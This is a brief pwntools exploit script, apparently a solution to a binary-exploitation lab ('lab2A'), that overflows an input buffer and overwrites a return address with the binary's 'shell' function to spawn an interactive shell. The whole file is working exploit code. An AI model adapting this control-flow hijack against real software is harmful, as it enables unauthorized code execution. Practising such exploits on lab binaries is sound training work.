from pwn import *
chall = ELF("./lab2A")
s = process(executable = "./lab2A", argv = [])

payload = b"a"*14
s.sendlineafter(b"10 words:\n", payload)
for i in range(0x13 + 4):
    s.sendline(b"a")
win = p64(chall.symbols["shell"])
for i in win:
    payload = bytes([i])
    s.sendline(payload)

payload = b"a"*12 + b"\x09\x00\x00"
s.send(payload)
s.interactive()

